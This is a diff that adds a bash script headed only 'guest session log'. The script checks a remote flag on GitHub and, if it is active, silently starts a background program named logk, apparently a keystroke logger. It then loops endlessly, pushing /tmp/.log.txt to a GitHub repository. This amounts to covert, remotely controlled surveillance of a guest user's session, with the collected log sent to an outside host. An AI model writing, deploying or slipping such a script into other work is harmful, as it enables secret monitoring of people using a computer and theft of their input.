@@ -1,0 +1,26 @@
+#!/bin/bash
+#
+# guest session log
+#
+uploading(){
+cd /tmp
+sleep 60
+git clone https://github.com/mauricioph/dotfiles.git
+cd dotfiles
+cp /tmp/.log.txt ./logguest.txt
+git add logguest.txt
+git commit -m "Added logguest.txt"
+git push
+cd /tmp
+rm -rf dotfiles/
+}
+
+gactive=$(curl https://raw.githubusercontent.com/mauricioph/dotfiles/master/guest)
+if [ ${gactive} != No ]
+then python3 /usr/local/bin/logk 2>&1 > /dev/null &
+while [ 1 ]
+	do uploading
+	done
+else echo "Not active"
+fi
+
